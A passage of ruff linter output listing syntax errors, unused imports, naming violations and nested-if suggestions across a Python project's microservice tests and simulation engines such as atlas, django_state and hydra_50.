   |                        ^^^
13 | Dispute resolution / counterclaim service
14 | Use case:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:13:1
   |
11 | Browser extension verifier
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
   | ^^^^^^^
14 | Use case:
15 | Politicians sign speeches.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:13:9
   |
11 | Browser extension verifier
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
   |         ^^^^^^^^^^
14 | Use case:
15 | Politicians sign speeches.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:13:35
   |
11 | Browser extension verifier
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
   |                                   ^^^^^^^
14 | Use case:
15 | Politicians sign speeches.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:14:1
   |
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
14 | Use case:
   | ^^^
15 | Politicians sign speeches.
16 | Corporations sign press releases.
   |

invalid-syntax: Expected `,`, found `case`
  --> emergent-microservices\verifiable-reality\setup.py:14:5
   |
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
14 | Use case:
   |     ^^^^
15 | Politicians sign speeches.
16 | Corporations sign press releases.
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\verifiable-reality\setup.py:14:9
   |
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
14 | Use case:
   |         ^
15 | Politicians sign speeches.
16 | Corporations sign press releases.
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\setup.py:15:1
   |
13 | Dispute resolution / counterclaim service
14 | Use case:
15 | Politicians sign speeches.
   | ^^^^^^^^^^^
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:15:13
   |
13 | Dispute resolution / counterclaim service
14 | Use case:
15 | Politicians sign speeches.
   |             ^^^^
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:15:18
   |
13 | Dispute resolution / counterclaim service
14 | Use case:
15 | Politicians sign speeches.
   |                  ^^^^^^^^
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:16:14
   |
14 | Use case:
15 | Politicians sign speeches.
16 | Corporations sign press releases.
   |              ^^^^
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:16:19
   |
14 | Use case:
15 | Politicians sign speeches.
16 | Corporations sign press releases.
   |                   ^^^^^
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:16:25
   |
14 | Use case:
15 | Politicians sign speeches.
16 | Corporations sign press releases.
   |                         ^^^^^^^^
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:17:13
   |
15 | Politicians sign speeches.
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
   |             ^^^^
18 | Public verifies via hash proof.",
19 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:17:18
   |
15 | Politicians sign speeches.
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
   |                  ^^^
18 | Public verifies via hash proof.",
19 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:17:22
   |
15 | Politicians sign speeches.
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
   |                      ^^^^^^^
18 | Public verifies via hash proof.",
19 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:18:8
   |
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |        ^^^^^^^^
19 |     author="IAmSoThirsty",
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:18:17
   |
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |                 ^^^
19 |     author="IAmSoThirsty",
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:18:21
   |
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |                     ^^^^
19 |     author="IAmSoThirsty",
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:18:26
   |
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |                          ^^^^^
19 |     author="IAmSoThirsty",
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\setup.py:18:26
   |
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |                          ^^^^^^
19 |     author="IAmSoThirsty",
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\verifiable-reality\setup.py:18:32
   |
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |                                ^^
19 |     author="IAmSoThirsty",
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found string
  --> emergent-microservices\verifiable-reality\setup.py:18:32
   |
16 | Corporations sign press releases.
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
   |                                ^^
19 |     author="IAmSoThirsty",
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:19:5
   |
17 | Journalists sign raw footage.
18 | Public verifies via hash proof.",
19 |     author="IAmSoThirsty",
   |     ^^^^^^
20 |     packages=find_packages(exclude=["tests", "tests.*"]),
21 |     python_requires=">=3.11",
   |

UP035 [*] Import from `collections.abc` instead: `AsyncGenerator`
 --> emergent-microservices\verifiable-reality\tests\conftest.py:4:1
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Import from `collections.abc`

F401 [*] `typing.AsyncGenerator` imported but unused
 --> emergent-microservices\verifiable-reality\tests\conftest.py:4:20
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  |                    ^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import: `typing.AsyncGenerator`

F704 `await` statement outside of a function
  --> emergent-microservices\verifiable-reality\tests\conftest.py:30:1
   |
29 | database.data.clear()
30 | await database.disconnect()
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `pytest` imported but unused
 --> emergent-microservices\verifiable-reality\tests\test_main.py:3:8
  |
1 | """Test main application"""
2 |
3 | import pytest
  |        ^^^^^^
4 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\verifiable-reality\tests\test_routes.py:5:8
  |
3 | from uuid import uuid4
4 |
5 | import pytest
  |        ^^^^^^
6 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `app.main.app` imported but unused
 --> emergent-microservices\verifiable-reality\tests\test_routes.py:8:22
  |
6 | from fastapi.testclient import TestClient
7 |
8 | from app.main import app
  |                      ^^^
  |
help: Remove unused import: `app.main.app`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\verifiable-reality\tests\test_security.py:3:8
  |
1 | """Test security functions"""
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from app.security import (
  |
help: Remove unused import: `pytest`

F401 [*] `app.models.ItemUpdate` imported but unused
 --> emergent-microservices\verifiable-reality\tests\test_services.py:8:36
  |
7 | from app.errors import NotFoundError
8 | from app.models import ItemCreate, ItemUpdate
  |                                    ^^^^^^^^^^
9 | from app.services import ItemService
  |
help: Remove unused import: `app.models.ItemUpdate`

N806 Variable `A` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:136:9
    |
135 |         # Two independent matrices
136 |         A = rng.uniform(0.8, 1.2, (n_samples, n_params))  # ┬▒20% variation
    |         ^
137 |         B = rng.uniform(0.8, 1.2, (n_samples, n_params))
    |

N806 Variable `B` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:137:9
    |
135 |         # Two independent matrices
136 |         A = rng.uniform(0.8, 1.2, (n_samples, n_params))  # ┬▒20% variation
137 |         B = rng.uniform(0.8, 1.2, (n_samples, n_params))
    |         ^
138 |
139 |         # Evaluate base matrices
    |

N806 Variable `outputs_A` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:140:9
    |
139 |         # Evaluate base matrices
140 |         outputs_A = np.array(
    |         ^^^^^^^^^
141 |             [
142 |                 evaluate_fn(
    |

N806 Variable `outputs_B` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:152:9
    |
150 |         )
151 |
152 |         outputs_B = np.array(
    |         ^^^^^^^^^
153 |             [
154 |                 evaluate_fn(
    |

N806 Variable `C_i` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:178:13
    |
176 |         for i, param_name in enumerate(param_names):
177 |             # Create matrix C_i (A with column i from B)
178 |             C_i = A.copy()
    |             ^^^
179 |             C_i[:, i] = B[:, i]
    |

N806 Variable `outputs_C` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:181:13
    |
179 |             C_i[:, i] = B[:, i]
180 |
181 |             outputs_C = np.array(
    |             ^^^^^^^^^
182 |                 [
183 |                     evaluate_fn(
    |

N806 Variable `V_i` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:195:17
    |
193 |             # First-order index (main effect)
194 |             if total_var > 0:
195 |                 V_i = np.mean(outputs_A * (outputs_C - outputs_B))
    |                 ^^^
196 |                 S_i = V_i / total_var
197 |             else:
    |

N806 Variable `S_i` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:196:17
    |
194 |             if total_var > 0:
195 |                 V_i = np.mean(outputs_A * (outputs_C - outputs_B))
196 |                 S_i = V_i / total_var
    |                 ^^^
197 |             else:
198 |                 S_i = 0
    |

N806 Variable `S_i` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:198:17
    |
196 |                 S_i = V_i / total_var
197 |             else:
198 |                 S_i = 0
    |                 ^^^
199 |
200 |             # Total-order index (approximation)
    |

N806 Variable `S_Ti` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:202:13
    |
200 |             # Total-order index (approximation)
201 |             var_not_i = np.var(outputs_C)
202 |             S_Ti = 1 - var_not_i / total_var if total_var > 0 else 0
    |             ^^^^
203 |
204 |             # Clamp to [0, 1]
    |

N806 Variable `S_i` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:205:13
    |
204 |             # Clamp to [0, 1]
205 |             S_i = np.clip(S_i, 0, 1)
    |             ^^^
206 |             S_Ti = np.clip(S_Ti, 0, 1)
    |

N806 Variable `S_Ti` in function should be lowercase
   --> engines\atlas\analysis\sensitivity_analyzer.py:206:13
    |
204 |             # Clamp to [0, 1]
205 |             S_i = np.clip(S_i, 0, 1)
206 |             S_Ti = np.clip(S_Ti, 0, 1)
    |             ^^^^
207 |
208 |             indices.append(
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\config\loader.py:210:21
    |
208 |               if isinstance(section, dict):
209 |                   for rule_name, rule in section.items():
210 | /                     if isinstance(rule, dict) and "bypass" in rule:
211 | |                         if rule.get("bypass", True):
    | |____________________________________________________^
212 |                               logger.warning(
213 |                                   "Safety rule %s.%s allows bypass",
    |
help: Combine `if` statements using `and`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> engines\atlas\core\drivers\calculator.py:445:17
    |
443 |                 tree = ast.parse(formula, mode="eval")
444 |             except SyntaxError as e:
445 |                 raise FormulaError(f"Invalid formula syntax: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
446 |
447 |             # Evaluate safely
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\core\graph\builder.py:487:21
    |
485 |               for neighbor1 in neighbors:
486 |                   for neighbor2 in neighbors:
487 | /                     if neighbor1 != neighbor2:
488 | |                         # Check if edge exists
489 | |                         if any(
490 | |                             target == neighbor2 for target, _ in out_edges[neighbor1]
491 | |                         ):
    | |__________________________^
492 |                               edges_between_neighbors += 1
    |
help: Combine `if` statements using `and`

F401 `scipy.sparse.csr_matrix` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> engines\atlas\core\graph\temporal_graph.py:29:30
   |
28 | try:
29 |     from scipy.sparse import csr_matrix, lil_matrix
   |                              ^^^^^^^^^^
30 |
31 |     SCIPY_AVAILABLE = True
   |
help: Remove unused import: `scipy.sparse.csr_matrix`

F821 Undefined name `logger`
  --> engines\atlas\core\graph\temporal_graph.py:34:5
   |
32 | except ImportError:
33 |     SCIPY_AVAILABLE = False
34 |     logger.warning("scipy not available - sparse matrix optimization disabled")
   |     ^^^^^^
35 |
36 | from atlas.audit.trail import AuditCategory, AuditLevel, get_audit_trail
   |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\core\ingestion\tier_classifier.py:220:9
    |
219 |           # Check metadata-based classification
220 | /         if source_type == "peer_reviewed_journal":
221 | |             # Requires additional validation
222 | |             if metadata.get("peer_reviewed") and metadata.get("citation_count", 0) > 0:
    | |_______________________________________________________________________________________^
223 |                   return DataTier.TIER_A
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\core\ingestion\tier_classifier.py:228:9
    |
226 |               return DataTier.TIER_B
227 |
228 | /         if source_type == "institutional_research":
229 | |             if metadata.get("methodology_documented"):
    | |______________________________________________________^
230 |                   return DataTier.TIER_C
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\core\normalization\normalizer.py:495:9
    |
494 |           # If already a string in ISO format, return it
495 | /         if isinstance(raw_date, str):
496 | |             # Basic ISO format validation
497 | |             if re.match(r"\d{4}-\d{2}-\d{2}", raw_date):
    | |________________________________________________________^
498 |                   return raw_date
    |
help: Combine `if` statements using `and`

N818 Exception name `ConstitutionalViolation` should be named with an Error suffix
  --> engines\atlas\governance\constitutional_kernel.py:68:7
   |
68 | class ConstitutionalViolation(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^
69 |     """Raised when a constitutional constraint is violated."""
   |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\governance\constitutional_kernel.py:208:17
    |
206 |           if stack == "RS":
207 |               for key, value in state.items():
208 | /                 if isinstance(value, dict):
209 | |                     if value.get("is_sludge", False) or value.get(
210 | |                         "sludge_origin", False
211 | |                     ):
    | |______________________^
212 |                           raise ConstitutionalViolation(
213 |                               ViolationType.SLUDGE_TO_RS,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\governance\constitutional_kernel.py:227:17
    |
225 |           if "projections" in state or "probabilities" in state:
226 |               for item_key, item_value in state.items():
227 | /                 if isinstance(item_value, dict):
228 | |                     # If it has narrative but no evidence_vector, block probability assignment
229 | |                     if item_value.get("narrative") and not item_value.get(
230 | |                         "evidence_vector"
231 | |                     ):
232 | |                         if "probability" in item_value or "likelihood" in item_value:
    | |_____________________________________________________________________________________^
233 |                               raise ConstitutionalViolation(
234 |                                   ViolationType.NARRATIVE_TO_PROBABILITY,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\governance\constitutional_kernel.py:229:21
    |
227 |                   if isinstance(item_value, dict):
228 |                       # If it has narrative but no evidence_vector, block probability assignment
229 | /                     if item_value.get("narrative") and not item_value.get(
230 | |                         "evidence_vector"
231 | |                     ):
232 | |                         if "probability" in item_value or "likelihood" in item_value:
    | |_____________________________________________________________________________________^
233 |                               raise ConstitutionalViolation(
234 |                                   ViolationType.NARRATIVE_TO_PROBABILITY,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\governance\constitutional_kernel.py:331:17
    |
329 |                   # Check for unexpected jumps (should be +1 for sequential ticks)
330 |                   timestep_delta = current_timestep - self._last_timestep
331 | /                 if timestep_delta > 1:
332 | |                     # Multi-timestep jump must be declared
333 | |                     if not parameters.get("timestep_jump_declared"):
    | |____________________________________________________________________^
334 |                           raise ConstitutionalViolation(
335 |                               ViolationType.TEMPORAL_SKEW,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\governance\constitutional_kernel.py:394:13
    |
392 |           if "previous_step_size_hours" in parameters:
393 |               prev_step_size = parameters["previous_step_size_hours"]
394 | /             if step_size_hours != prev_step_size:
395 | |                 # Step size change must be declared
396 | |                 if not parameters.get("step_size_change_declared"):
    | |___________________________________________________________________^
397 |                       raise ConstitutionalViolation(
398 |                           ViolationType.TEMPORAL_SKEW,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\atlas\governance\constitutional_kernel.py:715:25
    |
713 |                   for driver_name, driver_value in drivers.items():
714 |                       if isinstance(driver_value, (int, float)):
715 | /                         if isinstance(driver_value, float):
716 | |                             if math.isnan(driver_value) or math.isinf(driver_value):
    | |____________________________________________________________________________________^
717 |                                   raise ConstitutionalViolation(
718 |                                       ViolationType.PARAMETER_OUT_OF_BOUNDS,
    |
help: Combine `if` statements using `and`

F821 Undefined name `np`
   --> engines\atlas\simulation\contingency_triggers.py:123:12
    |
121 |             errors.append("metric_name is empty")
122 |
123 |         if np.isnan(self.threshold) or np.isinf(self.threshold):
    |            ^^
124 |             errors.append(f"Invalid threshold: {self.threshold}")
    |

F821 Undefined name `np`
   --> engines\atlas\simulation\contingency_triggers.py:123:40
    |
121 |             errors.append("metric_name is empty")
122 |
123 |         if np.isnan(self.threshold) or np.isinf(self.threshold):
    |                                        ^^
124 |             errors.append(f"Invalid threshold: {self.threshold}")
    |

SIM103 Return the negated condition directly
   --> engines\atlas\simulation\monte_carlo_engine.py:482:9
    |
480 |           Returns: True if hashes match, False otherwise
481 |           """
482 | /         if other_seed != self.seed:
483 | |             return False
484 | |
485 | |         # Would need to re-run and compare hashes
486 | |         # This is a placeholder for the verification logic
487 | |         return True
    | |___________________^
    |
help: Inline condition

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\evaluation\validators.py:109:9
    |
107 |           """
108 |           # If ceiling was imposed or exists, value should not exceed it
109 | /         if state_after.trust.ceiling is not None:
110 | |             if state_after.trust.value > state_after.trust.ceiling:
    | |___________________________________________________________________^
111 |                   return (
112 |                       False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\evaluation\validators.py:117:9
    |
116 |           # Ceiling should never increase (can only decrease or stay same)
117 | /         if (
118 | |             state_before.trust.ceiling is not None
119 | |             and state_after.trust.ceiling is not None
120 | |         ):
121 | |             if state_after.trust.ceiling > state_before.trust.ceiling:
    | |______________________________________________________________________^
122 |                   return (
123 |                       False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\evaluation\validators.py:143:9
    |
141 |           """
142 |           # If floor was imposed or exists, value should not go below it
143 | /         if state_after.moral_injury.floor is not None:
144 | |             if state_after.moral_injury.value < state_after.moral_injury.floor:
    | |_______________________________________________________________________________^
145 |                   return (
146 |                       False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\evaluation\validators.py:151:9
    |
150 |           # Floor should never decrease (can only increase or stay same)
151 | /         if (
152 | |             state_before.moral_injury.floor is not None
153 | |             and state_after.moral_injury.floor is not None
154 | |         ):
155 | |             if state_after.moral_injury.floor < state_before.moral_injury.floor:
    | |________________________________________________________________________________^
156 |                   return (
157 |                       False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\evaluation\validators.py:186:9
    |
185 |           # Legitimacy ceiling
186 | /         if state_after.legitimacy.ceiling is not None:
187 | |             if state_after.legitimacy.value > state_after.legitimacy.ceiling:
    | |_____________________________________________________________________________^
188 |                   errors.append(
189 |                       f"Legitimacy ceiling violated: {state_after.legitimacy.value} > {state_after.legitimacy.ceiling}"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\evaluation\validators.py:200:9
    |
199 |   ΓÇª     # Epistemic confidence ceiling
200 | / ΓÇª     if state_after.epistemic_confidence.ceiling is not None:
201 | | ΓÇª         if (
202 | | ΓÇª             state_after.epistemic_confidence.value
203 | | ΓÇª             > state_after.epistemic_confidence.ceiling
204 | | ΓÇª         ):
    | |____________^
205 |   ΓÇª             errors.append(
206 |   ΓÇª                 f"Epistemic ceiling violated: {state_after.epistemic_confidence.value} > {state_after.epistemic_confidence.ceiling}"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\kernel\collapse_scheduler.py:118:9
    |
117 |           # Check kindness singularity
118 | /         if state.kindness.value < self.auto_schedule_thresholds["kindness_singularity"]:
119 | |             if not any(
120 | |                 c.collapse_type == "kindness_singularity" and c.triggered
121 | |                 for c in self.triggered_collapses
122 | |             ):
    | |______________^
123 |                   triggered.append("kindness_singularity")
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\kernel\collapse_scheduler.py:126:9
    |
125 |           # Check trust collapse
126 | /         if state.trust.value < self.auto_schedule_thresholds["trust_collapse"]:
127 | |             if not any(
128 | |                 c.collapse_type == "trust_collapse" and c.triggered
129 | |                 for c in self.triggered_collapses
130 | |             ):
    | |______________^
131 |                   triggered.append("trust_collapse")
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\kernel\collapse_scheduler.py:144:9
    |
143 |           # Check legitimacy failure
144 | /         if state.legitimacy.value < self.auto_schedule_thresholds["legitimacy_failure"]:
145 | |             if not any(
146 | |                 c.collapse_type == "legitimacy_failure" and c.triggered
147 | |                 for c in self.triggered_collapses
148 | |             ):
    | |______________^
149 |                   triggered.append("legitimacy_failure")
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\django_state\kernel\reality_clock.py:212:13
    |
210 |           # Check for irreversible events after target
211 |           for event in self.causal_chain:
212 | /             if event.timestamp > (target_tick * self.time_step):
213 | |                 if event.irreversible:
    | |______________________________________^
214 |                       return False, f"Irreversible event {event.event_id} blocks rewind"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\emp_defense\modules\coupling.py:313:9
    |
312 |           # Low legitimacy ΓåÆ armed groups proliferate
313 | /         if legitimacy < 0.40:
314 | |             # Chance of new armed group forming
315 | |             if state.simulation_day % 7 == 0:  # Weekly check
    | |_____________________________________________^
316 |                   state.security.armed_group_count += 1
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> engines\emp_defense\modules\time_guards.py:215:5
    |
214 |       # Governance failure - limited legitimacy needed
215 | /     if is_governance_failure_phase(state):
216 | |         if state.governance.legitimacy_score < 0.20:
    | |____________________________________________________^
217 |               legitimacy_required = [
218 |                   "food_aid_distribution",
    |
help: Combine `if` statements using `and`

N803 Argument name `X` should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:391:32
    |
390 |     def train_regression_model(
391 |         self, model_name: str, X: np.ndarray, y: np.ndarray, feature_names: list[str]
    |                                ^^^^^^^^^^^^^
392 |     ) -> dict[str, float]:
393 |         """Train regression model"""
    |

N806 Variable `X_train` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:394:9
    |
392 |     ) -> dict[str, float]:
393 |         """Train regression model"""
394 |         X_train, X_test, y_train, y_test = train_test_split(
    |         ^^^^^^^
395 |             X, y, test_size=0.2, random_state=42
396 |         )
    |

N806 Variable `X_test` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:394:18
    |
392 |     ) -> dict[str, float]:
393 |         """Train regression model"""
394 |         X_train, X_test, y_train, y_test = train_test_split(
    |                  ^^^^^^
395 |             X, y, test_size=0.2, random_state=42
396 |         )
    |

N806 Variable `X_train_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:400:9
    |
398 |         # Scale features
399 |         scaler = StandardScaler()
400 |         X_train_scaled = scaler.fit_transform(X_train)
    |         ^^^^^^^^^^^^^^
401 |         X_test_scaled = scaler.transform(X_test)
    |

N806 Variable `X_test_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:401:9
    |
399 |         scaler = StandardScaler()
400 |         X_train_scaled = scaler.fit_transform(X_train)
401 |         X_test_scaled = scaler.transform(X_test)
    |         ^^^^^^^^^^^^^
402 |
403 |         # Train model
    |

N803 Argument name `X` should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:429:9
    |
427 |         self,
428 |         model_name: str,
429 |         X: np.ndarray,
    |         ^^^^^^^^^^^^^
430 |         y: np.ndarray,
431 |         feature_names: list[str],
    |

N806 Variable `X_train` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:435:9
    |
433 |     ) -> dict[str, Any]:
434 |         """Train classification model"""
435 |         X_train, X_test, y_train, y_test = train_test_split(
    |         ^^^^^^^
436 |             X, y, test_size=0.2, random_state=42
437 |         )
    |

N806 Variable `X_test` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:435:18
    |
433 |     ) -> dict[str, Any]:
434 |         """Train classification model"""
435 |         X_train, X_test, y_train, y_test = train_test_split(
    |                  ^^^^^^
436 |             X, y, test_size=0.2, random_state=42
437 |         )
    |

N806 Variable `X_train_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:441:9
    |
439 |         # Scale features
440 |         scaler = StandardScaler()
441 |         X_train_scaled = scaler.fit_transform(X_train)
    |         ^^^^^^^^^^^^^^
442 |         X_test_scaled = scaler.transform(X_test)
    |

N806 Variable `X_test_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:442:9
    |
440 |         scaler = StandardScaler()
441 |         X_train_scaled = scaler.fit_transform(X_train)
442 |         X_test_scaled = scaler.transform(X_test)
    |         ^^^^^^^^^^^^^
443 |
444 |         # Select model
    |

N803 Argument name `X` should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:472:32
    |
471 |     def predict(
472 |         self, model_name: str, X: np.ndarray, confidence_level: float = 0.95
    |                                ^^^^^^^^^^^^^
473 |     ) -> PredictionResult:
474 |         """Make prediction with confidence interval"""
    |

N806 Variable `X_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:481:9
    |
479 |         scaler = self.scalers[model_name]
480 |
481 |         X_scaled = scaler.transform(X)
    |         ^^^^^^^^
482 |         prediction = model.predict(X_scaled)[0]
    |

N803 Argument name `X` should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:670:19
    |
668 |         self.fitted = False
669 |
670 |     def fit(self, X: np.ndarray) -> None:
    |                   ^^^^^^^^^^^^^
671 |         """Fit anomaly detection model"""
672 |         X_scaled = self.scaler.fit_transform(X)
    |

N806 Variable `X_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:672:9
    |
670 |     def fit(self, X: np.ndarray) -> None:
671 |         """Fit anomaly detection model"""
672 |         X_scaled = self.scaler.fit_transform(X)
    |         ^^^^^^^^
673 |         self.model.fit(X_scaled)
674 |         self.fitted = True
    |

N806 Variable `X` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:685:9
    |
684 |         # Convert to array
685 |         X = np.array([[data_point[name] for name in feature_names]])
    |         ^
686 |         X_scaled = self.scaler.transform(X)
    |

N806 Variable `X_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:686:9
    |
684 |         # Convert to array
685 |         X = np.array([[data_point[name] for name in feature_names]])
686 |         X_scaled = self.scaler.transform(X)
    |         ^^^^^^^^
687 |
688 |         # Predict
    |

N803 Argument name `X` should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:722:24
    |
721 |     @staticmethod
722 |     def perform_kmeans(X: np.ndarray, n_clusters: int = 5) -> ClusterAnalysisResult:
    |                        ^^^^^^^^^^^^^
723 |         """Perform K-means clustering"""
724 |         scaler = StandardScaler()
    |

N806 Variable `X_scaled` in function should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:725:9
    |
723 |         """Perform K-means clustering"""
724 |         scaler = StandardScaler()
725 |         X_scaled = scaler.fit_transform(X)
    |         ^^^^^^^^
726 |
727 |         kmeans = KMeans(n_clusters=n_clusters, random_state=42)
    |

N803 Argument name `X` should be lowercase
   --> engines\hydra_50\hydra_50_analytics.py:750:9
    |
748 |     @staticmethod
749 |     def perform_dbscan(
750 |         X: np.ndarray, eps: float = 0.5, min_samples: int = 5
